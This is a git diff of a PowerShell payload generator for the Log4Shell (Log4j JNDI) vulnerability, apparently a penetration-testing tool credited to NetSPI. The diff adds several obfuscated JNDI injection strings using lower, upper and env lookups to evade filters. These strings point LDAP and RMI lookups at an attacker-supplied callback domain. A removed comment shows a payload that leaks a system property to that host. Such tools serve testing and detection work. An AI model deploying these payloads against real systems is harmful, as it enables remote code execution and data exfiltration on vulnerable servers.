@@ -1,8 +1,7 @@
 # Author: Scott Sutherland, NetSPI 2021
 # Create-Log4jPayload -Domain "callback.domain.com" -Port 389
-# Todo: encoding, more command viations, protocol variations?
+# Todo: encoding, more command variations, protocol variations, obfuscation variations?
 # Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
-# May need to add to the backend too: ${jndi:ldap:/callback.domain.com/${sys:java.vendor.url}} - just add the $MidPos2 to $EndPos; remove . and add /
 function Create-Log4jPayload
 (
     [Parameter(Position = 0)][System.String]$Domain,
@@ -88,10 +87,18 @@ function Create-Log4jPayload
         }       
     }
 
-    # add obfuscated version
-    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain}")
-   
+    # Add baseline obfuscation examples 
+    $null = $PayloadVariations.Rows.Add("`${`${lower:jndi}:`${lower:rmi}://$Domain/$word}")
+    $null = $PayloadVariations.Rows.Add("`${`${lower:`${lower:jndi}}:`${lower:rmi}://$Domain/$word}")
+    $null = $PayloadVariations.Rows.Add("`${`${lower:j}`${lower:n}`${lower:d}i:`${lower:rmi}://$Domain/$word}")
+    $null = $PayloadVariations.Rows.Add("`${jndi:`${lower:l}`${lower:d}a`${lower:p}://$Domain/$word}")
+    $null = $PayloadVariations.Rows.Add("`${jndi:ldap:`${upper:/}`${upper:/}$Domain`:$port/$word}")
+    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain}")  
+
+    # Show variations
     $PayloadVariations
+
+    # Show variation count
     $PayloadCount = $PayloadVariations.payload.Count
     Write-Verbose "$PayloadCount payloads were generated"
 
